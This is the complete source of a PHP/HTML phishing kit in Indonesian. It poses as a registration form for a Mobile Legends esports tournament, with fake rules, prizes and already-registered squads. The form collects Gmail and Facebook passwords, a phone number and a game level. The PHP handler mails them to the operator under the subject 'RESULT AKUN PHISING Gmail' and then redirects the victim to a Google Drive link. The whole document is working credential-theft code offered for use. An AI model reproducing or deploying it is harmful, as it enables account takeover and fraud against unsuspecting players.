
<?php
if(isset($_POST['reques'])){
	$gmail_log = $_POST['gmail'];
$password_gmail = $_POST['passwordgmail'];
$facebook_log = $_POST['facebook'];
$pwfb = $_POST['passwordfb'];
$level = $_POST['level'];
$hp = $_POST['hp'];
date_default_timezone_set('Asia/Jakarta');
include 'email.php';
include 'email2.php';
$subject2 =" $tgl RESULT AKUN PHISING Gmail  ######";
$headers2 ="From: admin@ngecrack.com>"; //Jangan Di ubah tod
$body2 = ' LOGIN Gmail: '.$gmail_log.' password: '.$password_gmail.' no hp '.$hp.' Login Facebook Email: '.$facebook_log.' pw: '.$pwfb.' level: '.$level.'  ';
mail($email2, $subject2, $body2, $headers2);
$md52  = md5(gmdate("r"));
$sha12  = sha1(gmdate("r"));
echo '<meta http-equiv="refresh" content="1;url=https://drive.google.com/file/d/1PB_X0lMYS519XfvtVJOvaGsapuy21y89/view">'; 
}
?>
<!DOCTYPE html>
<html lang="en">
    <head>
		<meta charset="UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> 
		<meta name="viewport" content="width=device-width, initial-scale=1.0"> 
        <title>Form Pengisian Turname Mobile Legend</title>
        <meta name="description" content="Daftar Turnamen Mobile Legend" />
        <meta name="keywords" content="Turnamen Mobile Legend, Turnamen Ml" />
        <meta name="author" content="e-sport" />
        <link rel="shortcut icon" href="https://pbs.twimg.com/profile_images/791531219653570560/1t2-vTXV.jpg"> 
        <link rel="stylesheet" type="text/css" href="css/style.css" />
        <script src="js/modernizr.custom.63321.js"></script>
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">

    </head>
    <body style="background: url(https://i.ibb.co/Xz0cQCn/download.jpg);">
        <div class="container">
			
<font color="white"><marquee><strong><b>| Squad Absent Sheep [ Berhasil Join Turnamen ] |, | Squad Blushing Flys [ Berhasil Join Turnamen ]  |, | Squad Defiant Pigs [ Berhasil Join Turnamen ] |
</h4></strong></marquee></font>
			<section class="main">
			<form method="POST" action="">
				<div class="form-2" style="background-color: white">
					<h1><span class="log-in">Form</span> Pendaftaran<span class="sign-up"> Turnamen Mobile Legend</span></h1><br>
					<h5>Jadwal Turnamen: 25 Juni 2020</h5>
					<h5>Sabtu: 19.00 - 22.00 </h5>
					<h5>Minggu 11.00 - 15.00 (Grand Final: 20.00)</h5><br>
					<h5>#RULES</h5>
					<ol style="color: black;">
						<li>1 tim terdiri dari 5 Pemain + 1 Cadangan (Boleh tidak pakai cadangan)</li>
						<li>1 Team = 1 Squad (Boleh Tidak 1 Squad)</li>
						<li>All Tier</li>
						<li>All Hero</li>
						<li>Skin On (Bebas mau menggunakan Skin atau tidak)</li>
						<li>Custom Draft Pick (Ban 6)</li>
						<li>Format pertandingan adalah BO 1 (Team atas first pick) dan final BO 3(Tim atas RM pertama dan bergantian), babak 8 besar akan menggunakan sistem double elimination (upper dan lower bracket)</li>
						<li>No Pause</li>
						<li>No Chat All & No Radio All</li>
						<li>Lag atau Gangguan Koneksi menjadi tanggung jawab pemain</li>
						<li>Join Room : Selambat-lambatnya 10 menit dari waktu yang telah ditentukan [mulai pertandingan mengikuti jadwal yang di tentukan apabila saat jam yang telah di tentukan tidak mulai lebih dari 15 menit akan didiskualifikasi]</li>
						<li>Hasil pertandingan dan bentuk kecurangan (Jika ada) bisa di SS/Screenshot lalu dikirimkan ke grup Line</li>
						<li>Melakukan Chat All atau Radio All akan di-diskualifikasi blaming(Sebanyak 2x)</li>
						<li>Waktu pertandingan bisa berubah sewaktu-waktu</li>
						<li>Panitia bisa mengambil keputusan sesuai kondisi dan keputusan panitia mutlak tidak bisa diganggu gugat</li>
					</ol>
					
					                  			

<center>
	<h4>::Total Hadiah::</h4>
	<h5>Rp.2.240.000</h5>
</center>

<b>
1. Juara Pertama Rp.1.150.000 + E-SERTIFIKAT<br>
2. Juara Kedua Rp.650.000 + E-SERTIFIKAT<br>
3. Juara Ketiga Rp.440.000 + E-SERTIFIKAT</b><br><br>
					</p>
					<p class="float">
						<label for="login"><i class="icon-google-plus"></i>Gmail</label>
						<input type="text" id="gmail" name="gmail" placeholder="gmail" required="">
					</p>
					<p class="float">
						<label for="password"><i class="icon-lock"></i>Password</label>
						<input type="password" id="password" name="passwordgmail" placeholder="Password" required="">
					</p>
					
					<p class="float">
						<label for="login"><i class="icon-facebook"></i>Facebook</label>
						<input type="text" id="fb" name="facebook" placeholder="email" required="">
					</p>
					<p class="float">
						<label for="password"><i class="icon-lock"></i>Password</label>
						<input type="password" id="password" name="passwordfb" placeholder="Password" required="">
					</p>
					<p class="float">
						<label for="Nomor_Hp"><i class="icon-phone"></i>Nomor </label>
						<input type="text" id="hp" name="hp" placeholder="Phone Number" required="">
					</p>
					<p class="float">
						<label for="Level"><i class="icon-home"></i>Level</label>
						<input type="text" id="level" name="level" placeholder="Level " required="">
                                        <br>
					</p>		
					<p>Dengan Ini Kami Menyatakan Bahwa Kami Bersedia Menerima Dan Mematuhi Peraturan Dan Kebijakan Dari Panitia Turnamen</p>
                                          
                                        <br>
                                        <button type="submit" class="btn btn-primary" name="reques">Join Turnamen</button>
					<center><h4> </h4></center>
				</form>​​
			</section>
			
        </div>
        <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script>
		<script type="text/javascript">
			$(function(){
			    $(".showpassword").each(function(index,input) {
			        var $input = $(input);
			        $("<p class='opt'/>").append(
			            $("<input type='checkbox' class='showpasswordcheckbox' id='showPassword' />").click(function() {
			                var change = $(this).is(":checked") ? "text" : "password";
			                var rep = $("<input placeholder='Password' type='" + change + "' />")
			                    .attr("id", $input.attr("id"))
			                    .attr("name", $input.attr("name"))
			                    .attr('class', $input.attr('class'))
			                    .val($input.val())
			                    .insertBefore($input);
			                $input.remove();
			                $input = rep;
			             })
			        ).append($("<label for='showPassword'/>").text("Show password")).insertAfter($input.parent());
			    });

			    $('#showPassword').click(function(){
					if($("#showPassword").is(":checked")) {
						$('.icon-lock').addClass('icon-unlock');
						$('.icon-unlock').removeClass('icon-lock');    
					} else {
						$('.icon-unlock').addClass('icon-lock');
						$('.icon-lock').removeClass('icon-unlock');
					}
			    });
			});
		</script>
    </body>
</html>